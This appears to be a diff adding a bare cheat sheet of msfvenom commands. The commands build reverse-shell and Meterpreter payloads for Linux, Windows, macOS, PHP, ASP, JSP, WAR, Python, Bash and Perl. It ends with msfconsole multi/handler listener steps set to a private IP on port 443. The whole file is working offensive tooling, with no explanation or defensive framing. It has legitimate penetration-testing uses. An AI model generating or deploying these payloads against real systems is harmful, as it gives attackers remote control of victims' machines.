@@ -1,0 +1,38 @@
+For Linux:
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf > /root/Downloads/exploits/exploit.elf
+
+For Windows:
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe > /root/Downloads/exploits/exploit.exe
+
+For Mac:
+msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f macho > /root/Downloads/exploits/exploit.macho
+
+For PHP:
+msfvenom -p php/meterpreter_reverse_tcp LHOST= LPORT= -f raw > /root/Downloads/exploits/exploit.php
+
+For ASP:
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp > /root/Downloads/exploits/exploit.asp
+
+For JSP:
+msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw > /root/Downloads/exploits/exploit.jsp
+
+For WAR:
+msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war > /root/Downloads/exploits/exploit.war
+
+For Python:
+msfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw > /root/Downloads/exploits/exploit.py
+
+For Bash:
+msfvenom -p cmd/unix/reverse_bash LHOST= LPORT= -f raw > /root/Downloads/exploits/exploit.sh
+
+For Perl:
+msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw > /root/Downloads/exploits/exploit.pl
+
+
+Create Listener
+
+msfconsole use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp // or whatever the payload is
+set lhost 192.168.23.103
+set lport 443
+exploit
